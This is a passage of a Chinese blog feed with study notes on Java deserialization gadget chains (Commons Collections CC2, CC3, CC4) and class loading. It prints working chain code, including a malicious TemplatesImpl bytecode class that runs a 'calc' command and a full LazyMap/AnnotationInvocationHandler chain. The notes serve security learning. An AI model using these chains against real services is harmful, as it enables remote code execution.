</span><br>       Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <br>               <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;)  <br>       &#125;;  <br>  <br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br></code></pre></td></tr></table></figure><p>前面一样的就直接贴过来了，不再说原理了，拿这里举例子，如果我们现在就想让它代码执行，只需要调用ChainedTransform的transform方法，那么我们开始继续向上<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206185124.png" alt="image.png"><br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206185145.png" alt="image.png"><br>现在就应该很清楚怎么做了<br>我们接下来的逻辑应该是这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);  <br>  <br><span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(transformingComparator);<br></code></pre></td></tr></table></figure><p>我们进行序列化和反序列化，发现并没有弹出计算器，所以我们看看缺了什么<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206190635.png" alt="image.png"><br>我们发现它进入heapify方法后没有进这个siftdown，所以我们的size是有问题的<br>我们看看有什么方法可以增加size，很简单，里面有一个add函数，我们调用它就可以增加长度<br>但是当我们add之后发现报错了<br>我们跟进去发现它也调用了compare方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206191049.png" alt="image.png"><br>那它就直接会走错路，类似之前的情况，直接执行，没有走反序列化这条路<br>那怎么办，我们就像上次C6的时候，先给它赋值为不能直接执行的一个类，然后在走完add之后在给它加进去，就像这样<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206191411.png" alt="image.png"><br>我们这里的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">transformingComparatorclazz</span> <span class="hljs-operator">=</span> transformingComparator.getClass();  <br><span class="hljs-type">Field</span> <span class="hljs-variable">transformerField</span> <span class="hljs-operator">=</span> transformingComparatorclazz.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);  <br>transformerField.setAccessible(<span class="hljs-literal">true</span>);  <br>transformerField.set(transformingComparator,chainedTransformer);  <br>  <br>serialize(priorityQueue);  <br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206191930.png" alt="image.png"><br>成功！</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>commons-collections 2</title>
    <link href="/2024/03/21/commons-collections%202/"/>
    <url>/2024/03/21/commons-collections%202/</url>
    
    <content type="html"><![CDATA[<p>终于！！！绕了一大圈终于过来力！！！<br>CC2它其实是没有走TrAXFilter的这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206192627.png" alt="image.png"><br>的实例化，而是尝试用InvokerTransformer去调用了<br>我们使用invokerTransformer方法调用代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br></code></pre></td></tr></table></figure><p>后面的就还和CC4一样<br>但当我运行的时候说没有这个类，所以我考虑是template没有传进去<br>最后看了别人的说要在add那里加上templates，而且第一个必须是templates<br>我进行了一个调试<br>当我们还是用add1和2的时候我们跟进去看看<br>走到heapify<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200013.png" alt="image.png"><br>compare方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200106.png" alt="image.png"><br>找到原因了，因为它需要在这里调用它的method，而我们传的是数字，所以这里变成了这样<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200145.png" alt="image.png"><br>而当我们将1和2改成template后我们追到这里看看吧<br>compare方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200354.png" alt="image.png"></p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200430.png" alt="image.png"><br>我们会发现这里加载到了TemplatesImpl，而之所以第一个必须要是templates的原因是如果第一次就加载不到，那么它就会抛出异常。<br>那为什么我们刚才在调CC4的时候这里是1和2就可以呢，我们接着去对比调试<br>compare方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200718.png" alt="image.png"><br>看吧，它这里调用的是ChainedTransformer方法而不是我们CC2中调用的InvokerTransformer方法，所以不用担心类加载不到，加add的原因仅仅是为了绕过这里的if<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240206200900.png" alt="image.png"><br>而我们CC2中这样设置一方面是为了绕过if，另一方面则是为了加载类。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>commons-collection 3</title>
    <link href="/2024/03/21/commons-collection%203/"/>
    <url>/2024/03/21/commons-collection%203/</url>
    
    <content type="html"><![CDATA[<h2 id="pre"><a href="#pre" class="headerlink" title="pre"></a>pre</h2><p>CC3和我们刚才调试的CC6有一些不同，CC1和CC6我们可以知道命令执行的方式是<code>Runtime.getRuntime().exec</code>但众所周知Java还可以通过加载任意类来进行恶意行为<br>CC3是基于这个的，所以我今天也花了不少时间来重新学习动态类加载，在初步学习之后的基础上，开始调试CC3</p><p>根据动态类加载的学习我们可以知道利用点通常在defineClass中，它是从字节码中加载</p><p>这个链子鉴于之前学习动态类加载的时候对加载器包括defineClass有相关调试，我就不在这个笔记中过多赘述了</p><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>本质问题出在这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205210926.png" alt="image.png"><br>我们一路一路往上头找，找到了<br>newTransformer-&gt;getTransletInstance-&gt;defineTransletClasses-&gt;defineClass<br>所以我们开始调试，看看这样的调用链需要满足什么条件<br>首先是这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205223112.png" alt="image.png"><br>因为它直接进行了判定，所以我们看看它的构造函数有没有对它赋值<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205223222.png" alt="image.png"></p><p>我们发现是对它的_class不有赋值，这样我们才能进到defineTransletClasses里，然后我们继续跟进<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205224142.png" alt="image.png"><br>发现bytecode需要赋值，不能为空，否则会抛出异常<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205224252.png" alt="image.png"><br>tfactory要赋值，因为要调用方法<br>所以我们直接反射改<br>但在改bytecodes时候需要注意，所以我们去看看它最后的defineClass<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205225228.png" alt="image.png"><br>要传一个一维数组<br>我们目前的代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br><span class="hljs-type">Class</span> <span class="hljs-variable">templatesClazz</span> <span class="hljs-operator">=</span> templates.getClass();  <br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br>nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);  <br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br>bytecodeField.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\codefile\\java\\out\\Test.class&quot;</span>));  <br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <br>nameField.set(templates,codes);<br></code></pre></td></tr></table></figure><p>那么tfactory呢，我们看这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205230353.png" alt="image.png"><br>它是个不可被序列化的值，所以我们这样子改一点用没有<br>但是为了测试代码，还是给它赋值吧<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205230716.png" alt="image.png"><br>目前预期就是一旦我们运行代码，就会加载我们刚才编写的恶意类从而弹出计算器，那我们现在试试看<br>好嘛，报错了<br>空指针错误<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205231817.png" alt="image.png"><br>是在defineTransletClasses这里出了问题，我们进去然后打个断点开始调试</p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205232054.png" alt="image.png"><br>安然无恙的走到这里了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205232245.png" alt="image.png"><br>已经加载成功了喵，为什么<br>根据报错我们可以找到问题在这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205232828.png" alt="image.png"><br>也就是这个_auxClasses参数是空的，我们有两个方法，第一个就是直接给_auxClasses赋值，第二个就是满足那个if然后进去，但是如果不满足if它会是-1，还是过不了这个判断条件<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205233125.png" alt="image.png"><br>所以它又会报另一个错，那么我们赋值的办法就行不通了<br>那么我们怎么办，只能满足那个if条件进去了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205233220.png" alt="image.png"><br>也就是我们执行代码的类的父类 要是这个东西<br>那么我们改写我们的Test.class<br>但是由于这个东西是一个抽象类，我们直接继承会报错，我们需要实现它的抽象方法<br>于是我们的测试代码需要写成这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;  <br>  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;  <br>  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span>&#123;  <br>    <span class="hljs-keyword">static</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;  <br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;  <br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);  <br>        &#125;  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;  <br>  <br>    &#125;  <br>  <br>    <span class="hljs-meta">@Override</span>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;  <br>  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们再次测试<br>看到这绷不住了哈哈哈<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205233930.png" alt="image.png"><br>我到底弹了多少次计算器啊哈哈哈哈<br>发个朋友圈纪念一下哈哈哈哈，太好笑了这个</p><h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>把它和CC1的ChainedTransformer进行一个联动<br>改成这样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(templates),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>),  <br>&#125;;  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br>chainedTransformer.transform(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205234611.png" alt="image.png"><br>也可以执行<br>所以我们直接给CC1后半段提溜过来<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205234727.png" alt="image.png"><br>嗯！宣</p><h2 id="yso链子"><a href="#yso链子" class="headerlink" title="yso链子"></a>yso链子</h2><p>但是yso用了另外一个类，InstantiateTransformer，这个类着实比较陌生，进去看看它的transform方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205235527.png" alt="image.png"><br>代码功能就是如果参数是一个class，那么就获取他的构造器和它的构造函数<br>那么我们直接这样构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);  <br>instantiateTransformer.transform(TrAXFilter.class);<br></code></pre></td></tr></table></figure><p>然后我们把transform去掉<br>和CC1连起来<br>草，刚才狠狠报错，难绷<br>因为我刚才改写的时候突然脑袋抽了，因为之前我们合并的时候没用到chainedTransformer，所以我就直接把decorate里的类改成了instantiateTransformer，但刚才我连着chainedTransformer一起的时候先是忘了开头需要用ConstantTransformer，又是忘记改decorate，不过最后终于解决了，最后代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br><span class="hljs-type">Class</span> <span class="hljs-variable">templatesClazz</span> <span class="hljs-operator">=</span> templates.getClass();  <br>  <br>  <br><span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br>nameField.setAccessible(<span class="hljs-literal">true</span>);  <br>nameField.set(templates,<span class="hljs-string">&quot;aaaa&quot;</span>);  <br>  <br>  <br><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br>bytecodeField.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\codefile\\java\\out\\Test.class&quot;</span>));  <br><span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;  <br>bytecodeField.set(templates,codes);  <br>  <br>  <br><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),  <br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;),  <br>&#125;;  <br>  <br>ChainedTransformer chainedTransformer=(ChainedTransformer) <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>HashMap&lt;Object,Object&gt; map =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br>  <br>Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);  <br>  <br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br><span class="hljs-type">Constructor</span> <span class="hljs-variable">annotationInvocationHandlerConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);  <br>annotationInvocationHandlerConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br><span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">lazymapInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);  <br>  <br><span class="hljs-type">Map</span> <span class="hljs-variable">mapProxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,lazymapInvocationHandler);  <br>  <br><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span>  annotationInvocationHandlerConstructor.newInstance(Override.class,mapProxy);  <br>serialize(o);  <br>unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br></code></pre></td></tr></table></figure><p>呜呜呜终于呜呜呜<br>呜呜呜呜呜呜呜以为快完了然后报了一大堆错然后改改改的感觉呜呜呜呜，当计算器弹出来的时候真的好开心呜呜呜</p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>动态类加载</title>
    <link href="/2024/03/21/%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <url>/2024/03/21/%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>我们尝试编写Person类如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205180824.png" alt="image.png"></p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205181511.png" alt="image.png"></p><h1 id="各类方法调用情况"><a href="#各类方法调用情况" class="headerlink" title="各类方法调用情况"></a>各类方法调用情况</h1><h3 id="无参方法"><a href="#无参方法" class="headerlink" title="无参方法"></a>无参方法</h3><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205181926.png" alt="image.png"></p><h2 id="有参方法"><a href="#有参方法" class="headerlink" title="有参方法"></a>有参方法</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205182204.png" alt="image.png"></p><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185143.png" alt="image.png"></p><h2 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185404.png" alt="image.png"></p><p>&#x3D;&#x3D;所以说Java的类在初始化的时候就会调用静态代码块&#x3D;&#x3D;</p><h2 id="获取类"><a href="#获取类" class="headerlink" title="获取类"></a>获取类</h2><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185545.png" alt="image.png"><br>所以class关键字只对Java类进行加载，并不会进行初始化</p><p>&#x3D;&#x3D;类在实例化的时候会调用构造代码块&#x3D;&#x3D;</p><h2 id="动态加载类"><a href="#动态加载类" class="headerlink" title="动态加载类"></a>动态加载类</h2><h3 id="Class-forName"><a href="#Class-forName" class="headerlink" title="Class.forName()"></a>Class.forName()</h3><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185837.png" alt="image.png"><br>我们跟进去看看<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185859.png" alt="image.png"><br>这里没有，我们可以看看它重载的另一种方法<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205185954.png" alt="image.png"><br>它是否初始化的值是在这里确定的<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205190036.png" alt="image.png"><br>也就是说它默认是初始化了的<br>我们尝试使用这个重载方法进行观察<br>代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassLoader</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> ClassLoader.getSystemClassLoader();  <br>Class.forName(<span class="hljs-string">&quot;Person&quot;</span>,<span class="hljs-literal">false</span>,cl);<br></code></pre></td></tr></table></figure><p>这样就被认为是没有初始化后的<br>输出如下<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205190347.png" alt="image.png"></p><p>在这里我们用了一个类加载器，那么如果我们使用这个类加载器去加载类，也就是用它的loadClass方法，它是否会对类进行初始化呢<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205190846.png" alt="image.png"><br>我们发现输出为空，那么很明显loadClass方法不会对类进行初始化</p><p>我们来瞅瞅类加载的具体实现</p><p>我们直接打断点调到loadClass方法里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205191116.png" alt="image.png"><br>但如果我们打印cl变量就知道，这个加载器是一个app类加载器，我们去这个位置找找它的loadClass方法</p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205191916.png" alt="image.png"></p><p><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205191926.png" alt="image.png"><br>但是这个方法是两个参数的，并不符合我们的调用<br>于是它就去了它的父类，也就走到了我们刚才强制步入的那个loadClass里<br>但是它又调用了两个参数的loadClass，所以下一步肯定又是回来<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192150.png" alt="image.png"><br>然后走到这里，它又调用了它父类的loadClass<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192252.png" alt="image.png"><br>然后check它是否被加载过<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192416.png" alt="image.png"><br>然后看它的父类是否存在，如果有的话就调用它父类的，如果没有就会去BootstrapClass<br>我们可以看到在这里的时候它的parent不是null<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192717.png" alt="image.png"><br>但是当我们继续往下走然后步入<br>它又回到了这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192918.png" alt="image.png"><br>这时如果我们再走到parent这里<img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205192951.png" alt="image.png">就会发现parent成null了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205193117.png" alt="image.png"><br>那是因为ExtClassLoader里就没有loadClass方法，所以它开始找BootstrapClass，然后还是没有找到<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205193320.png" alt="image.png"><br>我们在这里继续跟进去<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205193348.png" alt="image.png"><br>莫名其妙到了URLClassLoader，但我们去查的时候会发现无论是appClassLoader还是ExtClassLoader，它们都没有findClass这个方法<br>所以就去找了他俩的父类<br>然后我们走到了这里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205194716.png" alt="image.png"><br>我们发现它是在<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205194805.png" alt="image.png"><br>这个时候完成的类加载<br>我们跟进去发现它又调用了另一个defineClass<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205194919.png" alt="image.png"><br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195155.png" alt="image.png"><br>它又跑到SecureClassLoader里了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195222.png" alt="image.png"><br>显而易见的又是父类<br>然后它又调用了另一个重载的defineClass<br>最后发现它又回到了ClassLoader里<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195406.png" alt="image.png"><br>我们重点关注这个<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195503.png" alt="image.png"><br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195509.png" alt="image.png"><br>发现它是一个native方法，也就是在这里完成了类加载<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195559.png" alt="image.png"><br>从这里的返回值c也就能很好的看出来了<br>然后层层返回，就结束了<br><img src="https://fault-1315577519.cos.ap-nanjing.myqcloud.com/images/20240205195905.png" alt="image.png"></p><p>继承关系如下：<br>ClassLoader-&gt;SecureClassLoader-&gt;URLClassLoader-&gt;AppClassLoader<br>调用关系<br>loadClass-&gt;findClass-&gt;defineClass(从字节码加载)</p><h2 id="URLClassLoader任意类加载"><a href="#URLClassLoader任意类加载" class="headerlink" 